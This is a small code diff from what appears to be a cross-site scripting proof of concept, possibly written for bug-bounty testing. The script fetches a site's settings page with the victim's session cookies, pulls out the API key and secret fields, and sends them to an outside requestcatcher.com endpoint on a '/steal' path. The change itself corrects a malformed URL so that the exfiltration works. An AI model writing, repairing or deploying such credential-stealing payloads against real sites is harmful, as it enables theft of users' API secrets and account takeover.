@@ -5,6 +5,6 @@ fetch("/client/settings/configuration", {credentials:"include"})
     let k=d.querySelector('input[name="api_key"]')?.value;
     let s=d.querySelector('input[name="api_secret"]')?.value;
     if(k&&s){
-      new Image().src=`https://https://secuna_seapower.requestcatcher.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`;
+      new Image().src=`https://secuna_seapower.requestcatcher.com/steal?key=${encodeURIComponent(k)}&secret=${encodeURIComponent(s)}`;
     }
   });
